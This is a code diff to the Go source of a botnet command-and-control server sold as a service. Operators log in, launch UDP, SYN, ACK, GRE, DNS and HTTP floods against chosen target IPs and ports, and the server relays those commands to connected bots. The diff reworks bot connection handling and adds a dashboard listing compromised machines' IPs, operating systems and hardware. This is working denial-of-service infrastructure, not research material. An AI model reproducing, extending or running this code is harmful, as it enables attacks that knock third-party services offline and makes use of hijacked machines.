@@ -11,10 +11,10 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"sort"
 	"strconv"
 	"strings"
 	"sync"
-	"sync/atomic"
 	"syscall"
 	"time"
 )
@@ -32,11 +32,6 @@ const (
 )
 
 var (
-	botConns     []*tls.Conn
-	botConnsLock sync.RWMutex
-)
-
-var (
 	semaphore   = make(chan struct{}, 1000)
 	clientsLock sync.RWMutex
 )
@@ -44,11 +39,11 @@ var (
 type client struct {
 	conn         net.Conn
 	user         User
-	sessionToken string // Add this field
-	sessionID    string // Add this field
+	sessionToken string
+	sessionID    string
 }
 
-type Attack struct { // Capitalize to export
+type Attack struct {
 	method   string
 	ip       string
 	port     string
@@ -60,13 +55,12 @@ type Attack struct { // Capitalize to export
 var (
 	ongoingAttacks    = make(map[net.Conn]Attack)
 	ongoingAPIAttacks = make(map[string]Attack)
-	apiAttackLock     sync.Mutex
-	attackHistory     []Attack
-	clients           = []*client{}
-	attackLock        sync.Mutex
-	historyLock       sync.Mutex
-	botCountLock      sync.Mutex
-	botCount          int
+	// apiAttackLock     sync.Mutex
+	attackHistory          []Attack
+	clients                = []*client{}
+	attackLock             sync.Mutex
+	historyLock            sync.Mutex
+	ongoingAPIAttacksMutex sync.RWMutex
 )
 
 func initializeComponents() error {
@@ -89,30 +83,22 @@ func initializeComponents() error {
 func main() {
 	os.Setenv("LANG", "en_US.UTF-8")
 
-	// Set up signal handling for graceful shutdown
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)
 
-	// Goroutine to handle graceful shutdown
 	go func() {
 		sig := <-sigChan
 		fmt.Printf("\nReceived signal: %v. Shutting down gracefully...\n", sig)
 
-		// Close all connections in the pool
 		connectionPool.CloseAll()
 
-		// Close the global logger if it exists
 		if globalLogger != nil {
 			globalLogger.Close()
 		}
 
-		// Close API server if it's running
 		if apiServer != nil && apiServer.started {
-			// Create a simple shutdown context
 			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 			defer cancel()
-
-			// Gracefully shutdown the HTTP server
 			if err := apiServer.server.Shutdown(ctx); err != nil {
 				fmt.Printf("Error shutting down API server: %v\n", err)
 			}
@@ -125,7 +111,6 @@ func main() {
 	}()
 
 	if _, err := os.ReadFile("data/json/users.json"); err != nil {
-		// File doesn't exist or can't be read, continue without users file
 	}
 	cert, err := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
 	if err != nil {
@@ -165,7 +150,7 @@ func main() {
 	InitRateLimiter()
 	go updateTitle()
 	go ScheduleDiagnosticRequests()
-	go CleanupSessions()
+	go StartHeartbeatMonitor()
 	go StartHeartbeatMonitor()
 	go CleanupQuotas()
 	go CleanupAuthAttempts()
@@ -178,7 +163,6 @@ func main() {
 		fmt.Printf("Error starting API server: %v\n", err)
 	}
 
-	// Ensure connection pool is closed on normal exit too
 	defer connectionPool.CloseAll()
 
 	fmt.Println("[☾☼☽] User server started on", USER_SERVER_IP+":"+USER_SERVER_PORT)
@@ -197,11 +181,9 @@ func main() {
 	}
 	defer botListener.Close()
 
-	// Use WaitGroup to manage goroutines
 	var wg sync.WaitGroup
 	stopChan := make(chan struct{})
 
-	// User connection handler goroutine
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
@@ -226,7 +208,6 @@ func main() {
 		}
 	}()
 
-	// Bot connection handler goroutine
 	wg.Add(1)
 	go func() {
 		defer wg.Done()
@@ -245,52 +226,31 @@ func main() {
 						continue
 					}
 				}
-				tlsConn := conn.(*tls.Conn)
 
-				if err := connectionPool.Put(tlsConn.RemoteAddr().String(), tlsConn); err != nil {
-					fmt.Printf("Connection pool full, rejecting bot: %v\n", err)
-					tlsConn.Close()
+				tlsConn, ok := conn.(*tls.Conn)
+				if !ok {
+					fmt.Println("Not a TLS connection")
+					conn.Close()
 					continue
 				}
 
-				fmt.Println("[☾☼☽] Bot connected From", conn.RemoteAddr())
 				go handleBotConnection(tlsConn)
 			}
 		}
 	}()
 
-	// Wait for shutdown signal
 	<-sigChan
 	fmt.Println("\nShutting down servers...")
-
-	// Signal all goroutines to stop
 	close(stopChan)
-
-	// Close listeners to unblock Accept() calls
 	userListener.Close()
 	botListener.Close()
-
-	// Wait for all goroutines to finish
 	wg.Wait()
-
-	// Final cleanup
 	connectionPool.CloseAll()
 	if globalLogger != nil {
 		globalLogger.Close()
 	}
 
 	fmt.Println("Server shutdown completed.")
-}
-
-func removeBotConn(conn *tls.Conn) {
-	botConnsLock.Lock()
-	defer botConnsLock.Unlock()
-	for i, c := range botConns {
-		if c == conn {
-			botConns = append(botConns[:i], botConns[i+1:]...)
-			break
-		}
-	}
 }
 
 func updateTitle() {
@@ -303,11 +263,13 @@ func updateTitle() {
 		copy(currentClients, clients)
 		clientsLock.RUnlock()
 
+		botStats := heartbeatManager.GetBotStatusSummary()
+		attackCount := len(ongoingAttacks) + len(ongoingAPIAttacks)
+		spinIndex := time.Now().Second() % len(spinChars)
+
 		for _, c := range currentClients {
-			spinIndex := time.Now().Second() % len(spinChars)
-			attackCount := len(ongoingAttacks) + len(ongoingAPIAttacks)
-			title := fmt.Sprintf("    [%c]  Servers: %d | Attacks: %d |  ☾☼☽  | User: %s [%c]",
-				spinChars[spinIndex], getBotCount(), attackCount, c.user.Username, spinChars[spinIndex])
+			title := fmt.Sprintf("    [%c]  Bots: %d/%d | Attacks: %d |  ☾☼☽  | User: %s [%c]",
+				spinChars[spinIndex], botStats["ONLINE"], botStats["TOTAL"], attackCount, c.user.Username, spinChars[spinIndex])
 			setTitle(c.conn, title)
 		}
 	}
@@ -322,7 +284,7 @@ func authUser(conn net.Conn) (bool, *client) {
 	}
 
 	drawHeader := func() {
-		conn.Write([]byte("\033[2J\033[H")) // Clear screen
+		conn.Write([]byte("\033[2J\033[H"))
 
 		// Grayscale colors range: 232 (black) → 255 (white)
 		grayscale := []int{232, 234, 236, 238, 240, 242, 244, 246, 248, 250, 252, 254, 255}
@@ -343,26 +305,19 @@ func authUser(conn net.Conn) (bool, *client) {
 			"╰══════════════════════════════════════════════════════════════════════════════╯",
 		}
 
-		// Assign each line a grayscale color progressively
 		for i, line := range lines {
-			color := grayscale[i*len(grayscale)/len(lines)] // map line to grayscale
+			color := grayscale[i*len(grayscale)/len(lines)]
 			conn.Write([]byte(fmt.Sprintf("\x1b[38;5;%dm%s\033[0m\n", color, line)))
 		}
 	}
 	drawHeader()
 
-	// Draw header once before the loop
 	for i := 0; i < 3; i++ {
 
-		// Auth decoration
 		conn.Write([]byte("\n"))
 		conn.Write([]byte("                       \033[38;5;109m► Auth\033[38;5;146ment\033[38;5;182micat\033[38;5;218mion --- \033[38;5;196mReq\033[38;5;161muir\033[38;5;89med\033[0m\n"))
-
-		// Username prompt
 		conn.Write([]byte("\033[38;5;245m                               ☉ Username\033[38;5;255m: \033[0m"))
 		username, _ := getFromConn(conn)
-
-		// Password prompt
 		conn.Write([]byte("\033[38;5;245m                               ☉ Password\033[38;5;255m: \033[0m"))
 		password, _ := getFromConn(conn)
 		conn.Write([]byte("\033[0m"))
@@ -370,7 +325,6 @@ func authUser(conn net.Conn) (bool, *client) {
 		if exists, user := AuthUser(username, password); exists {
 			ResetAuthAttempts(clientIP)
 
-			// Create JWT session
 			session, token, err := CreateSession(*user, clientIP, "terminal")
 			if err != nil {
 				writeError(conn, "Session creation failed: "+err.Error())
@@ -412,7 +366,6 @@ func authUser(conn net.Conn) (bool, *client) {
 
 		LogAuth(username, clientIP, false)
 
-		// Show invalid credentials immediately
 		remaining := 2 - i
 		conn.Write([]byte("\033[2J\033[H"))
 		conn.Write([]byte("\033[3J\033[H\033[2J"))
@@ -450,7 +403,6 @@ func sendToBots(cmdPacket CommandPacket) {
 		return
 	}
 
-	// Serialize the command packet
 	cmdData := make([]byte, 42)
 	copy(cmdData[0:16], cmdPacket.Method[:])
 	copy(cmdData[16:20], cmdPacket.TargetIP[:])
@@ -465,7 +417,6 @@ func sendToBots(cmdPacket CommandPacket) {
 		return
 	}
 
-	// Use connection pool to send to all bots
 	connectionPool.mutex.RLock()
 	defer connectionPool.mutex.RUnlock()
 
@@ -481,15 +432,15 @@ func sendToBots(cmdPacket CommandPacket) {
 }
 
 func Ping(conn *tls.Conn, stopPing <-chan struct{}) {
-	ticker := time.NewTicker(30 * time.Second) // Reduced frequency to match heartbeat
+	ticker := time.NewTicker(15 * time.Second)
 	defer ticker.Stop()
 
 	for {
 		select {
 		case <-ticker.C:
-			heartbeat := CreatePacket(PacketTypeHeartbeat, []byte{})
-			if err := SendPacket(conn, heartbeat); err != nil {
-				fmt.Printf("Error sending heartbeat to bot %s: %v\n", conn.RemoteAddr(), err)
+			ping := CreatePacket(PacketTypePing, []byte("|ping|"))
+			if err := SendPacket(conn, ping); err != nil {
+				fmt.Printf("Error sending ping to bot %s: %v\n", conn.RemoteAddr(), err)
 				return
 			}
 
@@ -502,7 +453,6 @@ func Ping(conn *tls.Conn, stopPing <-chan struct{}) {
 func handleRequest(conn *tls.Conn) {
 	clientIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()
 
-	// Rate limiting
 	if allowed, remaining := CheckConnectionRateLimit(clientIP); !allowed {
 		conn.Write([]byte(fmt.Sprintf("Too many connections. Try again in %v\r\n", remaining)))
 		conn.Close()
@@ -622,6 +572,17 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+					conn.Write([]byte("\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mTFX Animation System\x1b[38;5;231m §        ║   ┌────────────────────┐     ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   │  ANIMATION PLAYER  │     ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Terminal Graphics Display\x1b[38;5;231m                   ║   │       LOADING...   │     ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣   └────────────────────┘     ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Command:   \x1b[38;5;82mGIF/TFX PLAYER\x1b[38;5;231m                 ║   ░░░░░░░░░░░░░░░░░░░░░░     ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Format:    \x1b[38;5;82m.TFX ANIMATION FILES\x1b[38;5;231m           ║    ────────────────────      ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mPROCESSING REQUEST\x1b[38;5;231m             ║    ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒      ║\r\n"))
+					conn.Write([]byte("\x1b[38;5;231m╰═══════════════════════════════════════════════╩══════════════════════════════╯\n\r"))
+					time.Sleep(2 * time.Second)
 					gifCommandHandler(parts, conn)
 				case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
 					conn.Write([]byte("\033[2J\033[H"))
@@ -660,9 +621,8 @@ func handleRequest(conn *tls.Conn) {
 						LogQuotaExceeded(client.user.Username, "attack")
 						continue
 					}
-					AttackAnimation.Play(conn, 2*time.Second, "Launching Attack...")
+					AttackAnimation.Play(conn, 1*time.Second, "Launching Flood...")
 
-					// Attack Launch Success Display
 					conn.Write([]byte("\r\n"))
 					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m║             § \x1b[38;5;51mAttack Launched Successfully!\x1b[38;5;231m §           ║   ┌────────────────────┐   ║\n\r"))
@@ -693,7 +653,6 @@ func handleRequest(conn *tls.Conn) {
 					attackHistory = append(attackHistory, ongoingAttacks[conn])
 					historyLock.Unlock()
 					go func(conn net.Conn, attack Attack) {
-						// Remove progress bar, just wait for duration
 						time.Sleep(attack.duration)
 						attackLock.Lock()
 						delete(ongoingAttacks, conn)
@@ -718,32 +677,32 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
 					conn.Write([]byte("\r\n"))
 					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mCurrent Attack Status\x1b[38;5;231m §            ║ ╔══════════════════════════╗ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ║      LIVE SESSION      ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║ \x11b[38;5;45m● Active Attack Monitor\x1b[38;5;231m                      ║ ║   ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐   ║ ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ║   │ │ │ │ │ │ │ │ │   ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║               § \x1b[38;5;51mCurrent Attack Status\x1b[38;5;231m §       ║ ╔══════════════════════════╗ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ║      LIVE SESSION        ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Active Attack Monitor\x1b[38;5;231m                       ║ ║   ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐    ║ ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣ ║    │ │ │ │ │ │ │ │ │     ║ ║\n\r"))
 
 					attackLock.Lock()
 					if attack, exists := ongoingAttacks[conn]; exists {
 						remaining := time.Until(attack.start.Add(attack.duration))
 						if remaining > 0 {
-							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK IN PROGRESS\x1b[38;5;231m              ║ ║   └─┘ └─┘ └─┘ └─┘ └─┘   ║ ║\n\r"))
-							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ╚══════════════════════════╝ ║\n\r"))
-							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m   ║                            ║\r\n", attack.method)))
-							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m         ║                            ║\r\n", attack.ip, attack.port)))
-							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Remaining: \x1b[38;5;82m%-26d\x1b[38;5;231m   ║                            ║\r\n", int(remaining.Seconds()))))
-							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Elapsed:   \x1b[38;5;82m%-26d\x1b[38;5;231m   ║                            ║\r\n", int(time.Since(attack.start).Seconds()))))
-							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
-							conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mAttack is actively running...\x1b[38;5;231m              ║\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;82mATTACK IN PROGRESS\x1b[38;5;231m             ║ ║   └─┘ └─┘ └─┘ └─┘ └─┘    ║ ║\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩═╩══════════════════════════╩═╯\n\r"))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Method:    \x1b[38;5;82m%-30s\x1b[38;5;231m                                \r\n", attack.method)))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Target:    \x1b[38;5;82m%-15s:%-5s\x1b[38;5;231m                            \r\n", attack.ip, attack.port)))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Remaining: \x1b[38;5;82m%-26d\x1b[38;5;231m                                  \r\n", int(remaining.Seconds()))))
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Elapsed:   \x1b[38;5;82m%-26d\x1b[38;5;231m                                   \r\n", int(time.Since(attack.start).Seconds()))))
+							conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╗\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mAttack is actively running...\x1b[38;5;231m                                   ║\n\r"))
 						} else {
 							delete(ongoingAttacks, conn)
-							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mATTACK COMPLETED\x1b[38;5;231m                 ║ ╔══════════════════════════╗ ║\n\r"))
-							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mSession cleaned up\x1b[38;5;231m                 ║ ║     FINISHED        ║ ║\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mATTACK COMPLETED\x1b[38;5;231m              ║ ╔══════════════════════════╗ ║\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mSession cleaned up\x1b[38;5;231m              ║ ║     FINISHED        ║ ║\n\r"))
 							conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬ ╚══════════════════════════╝ ║\n\r"))
 						}
 					} else {
-						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO ACTIVE ATTACK\x1b[38;5;231m                  ║ ░░░░░░░░░░░░░░░░░░░░░░ ║\n\r"))
-						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mNo ongoing attack found\x1b[38;5;231m             ║ ──────────────────── ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mNO ACTIVE ATTACK\x1b[38;5;231m               ║ ║  ░░░░░░░░░░░░░░░░░░░░░░  ║ ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Message:   \x1b[38;5;196mNo ongoing attack found\x1b[38;5;231m        ║ ║   ────────────────────   ║ ║\n\r"))
 						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
 					}
 					attackLock.Unlock()
@@ -767,9 +726,9 @@ func handleRequest(conn *tls.Conn) {
 						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Active:    \x1b[38;5;82m%-26d\x1b[38;5;231m   ║ ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒ ║\r\n", len(combined))))
 						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Status:    \x1b[38;5;82mATTACKS IN PROGRESS\x1b[38;5;231m           ║ ●━━━━━━━━━━━━━━━━━━━━● ║\n\r"))
 						conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
-
+						// Limit display to 5 attacks
 						for i, attack := range combined {
-							if i >= 5 { // Limit display to 5 attacks
+							if i >= 5 {
 								conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   + %d more attacks running...\x1b[38;5;231m           ║                            ║\r\n", len(combined)-5)))
 								break
 							}
@@ -790,60 +749,108 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
+
+					botInfos := GetActiveBotInfos()
 					conn.Write([]byte("\r\n"))
 					conn.Write([]byte("\x1b[38;5;231m╭═══════════════════════════════════════════════╦══════════════════════════════╮\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mBot Status Dashboard\x1b[38;5;231m §         ║    ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║              § \x1b[38;5;51mBot Telemetry Dashboard\x1b[38;5;231m §      ║    ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐   ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╣    │ │ │ │ │ │ │ │ │ │ │ │   ║\n\r"))
-					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Detailed Bot Network Analysis\x1b[38;5;231m               ║    └─┘ └─┘ └─┘ └─┘ └─┘ └─┘   ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Direct bot-reported metrics\x1b[38;5;231m             ║    └─┘ └─┘ └─┘ └─┘ └─┘ └─┘   ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╬══════════════════════════════╣\n\r"))
 
-					botConnsLock.RLock()
-					totalBots := len(botConns)
-					botConnsLock.RUnlock()
-
-					statuses := heartbeatManager.GetAllBotsStatus()
-					online := 0
-					lagging := 0
-					offline := 0
-
-					for _, status := range statuses {
-						switch status {
-						case "ONLINE":
-							online++
-						case "LAGGING":
-							lagging++
-						case "OFFLINE":
-							offline++
+					totalActive := len(botInfos)
+					diagnosed := 0
+					osCounts := make(map[string]int)
+					for _, bot := range botInfos {
+						osName := strings.TrimSpace(bot.SystemInfo.OS)
+						if osName != "" {
+							diagnosed++
+							osCounts[osName]++
 						}
 					}
 
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Total:     \x1b[38;5;82m%-26d\x1b[38;5;231m     ║ ╔══════════════════════════╗ ║\r\n", totalBots)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Online:    \x1b[38;5;82m%-26d\x1b[38;5;231m     ║ ║       BOT HEALTH         ║ ║\r\n", online)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Lagging:   \x1b[38;5;226m%-26d\x1b[38;5;231m     ║ ║     ●●●○○○●●●○○○●●●      ║ ║\r\n", lagging)))
-					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Offline:   \x1b[38;5;196m%-26d\x1b[38;5;231m     ║ ╚══════════════════════════╝ ║\r\n", offline)))
+					uniqueOS := len(osCounts)
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Active Bots:            \x1b[38;5;82m%-20d\x1b[38;5;231m║ ╔══════════════════════════╗ ║\r\n", totalActive)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Diagnostics received:   \x1b[38;5;82m%-20d\x1b[38;5;231m║ ║  TELEMETRY CONFIRMED   ║ ║\r\n", diagnosed)))
+					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Unique OS fingerprints:  \x1b[38;5;82m%-20d\x1b[38;5;231m║ ╚══════════════════════════╝ ║\r\n", uniqueOS)))
 					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
 
-					if len(statuses) > 0 {
-						conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Recent Bot Activity\x1b[38;5;231m                                 ║\n\r"))
-						conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════╢\n\r"))
-						count := 0
-						for botID, status := range statuses {
-							if count >= 3 {
-								break
+					if totalActive == 0 {
+						conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;196mNo bots are currently reporting telemetry\x1b[38;5;231m                     ║\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
+						break
+					}
+
+					sort.Slice(botInfos, func(i, j int) bool {
+						return botInfos[i].LastPing.After(botInfos[j].LastPing)
+					})
+
+					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45m● Bot Telemetry Snapshot\x1b[38;5;231m                               ║\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════╢\n\r"))
+
+					maxDisplay := 5
+					if len(botInfos) < maxDisplay {
+						maxDisplay = len(botInfos)
+					}
+
+					for i := 0; i < maxDisplay; i++ {
+						bot := botInfos[i]
+						displayID := bot.ID
+						if len(displayID) > 16 {
+							displayID = displayID[:13] + "..."
+						}
+						safeIP := bot.IP
+						if safeIP == "" {
+							safeIP = "pending"
+						}
+						pingStr := "n/a"
+						if bot.PingMs > 0 {
+							pingStr = fmt.Sprintf("%dms", bot.PingMs)
+						}
+						osName := strings.TrimSpace(bot.SystemInfo.OS)
+						if osName == "" {
+							osName = "unknown"
+						}
+						arch := strings.TrimSpace(bot.SystemInfo.Arch)
+						if arch == "" {
+							arch = "?"
+						}
+						uptime := strings.TrimSpace(bot.SystemInfo.Uptime)
+						if uptime == "" {
+							uptime = "n/a"
+						}
+
+						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m%-16s\x1b[38;5;231m | IP: %-15s | OS: %-12s | Arch: %-5s | Ping: %-6s║\r\n",
+							displayID, safeIP, osName, arch, pingStr)))
+
+						if bot.SystemInfo.CPU != "" || bot.SystemInfo.RAM != "" || bot.SystemInfo.Load1 != "" {
+							cpu := strings.TrimSpace(bot.SystemInfo.CPU)
+							if cpu == "" {
+								cpu = "n/a"
 							}
-							ping := heartbeatManager.GetBotPing(botID)
-							statusColor := "\x1b[38;5;82m"
-							if status == "LAGGING" {
-								statusColor = "\x1b[38;5;226m"
+							ram := strings.TrimSpace(bot.SystemInfo.RAM)
+							if ram == "" {
+								ram = "n/a"
 							}
-							if status == "OFFLINE" {
-								statusColor = "\x1b[38;5;196m"
+							load := bot.SystemInfo.Load1
+							if load == "" {
+								load = "-"
 							}
-							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   %s%-8s: %-12s (ping: %-6v\x1b[38;5;231m                 ║\r\n",
-								statusColor, botID, status, ping)))
-							count++
+							disk := bot.SystemInfo.Disk
+							if disk == "" {
+								disk = "-"
+							}
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║      CPU: %-20s RAM: %-10s Uptime: %-14s Load1: %-6s Disk: %-8s║\r\n",
+								cpu, ram, uptime, load, disk)))
+						} else {
+							conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║      Uptime: %-26s                                  ║\r\n", uptime)))
 						}
 					}
+
+					if len(botInfos) > maxDisplay {
+						conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   ... and %d more bots reporting ...\x1b[38;5;231m                     ║\r\n", len(botInfos)-maxDisplay)))
+					}
+
 					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
 
 				case "stopattack":
@@ -964,7 +971,7 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Status:    \x1b[38;5;196mSESSION ENDING\x1b[38;5;231m                   ║   ░░░░░░░░░░░░░░░░░░░░░░   ║\r\n"))
 					conn.Write([]byte("\x1b[38;5;231m║   \x1b[38;5;45m✪\x1b[38;5;231m Action:    \x1b[38;5;196mCONNECTION CLOSE\x1b[38;5;231m                 ║   ────────────────────   ║\r\n"))
 					conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m║   \x1b[38;5;45m❃\x1b[38;5;231m Time:      \x1b[38;5;196m%-26s\x1b[38;5;231m   ║   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ║\r\n", time.Now().Format("15:04:05"))))
-					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
+					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════════════╩══════════════════════════════╣\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m║              \x1b[38;5;51mThank you for using our services!\x1b[38;5;231m              ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
 					time.Sleep(2 * time.Second)
@@ -1006,7 +1013,6 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
 					conn.Write([]byte("\033[2J\033[H"))
 					conn.Write([]byte("\r\n"))
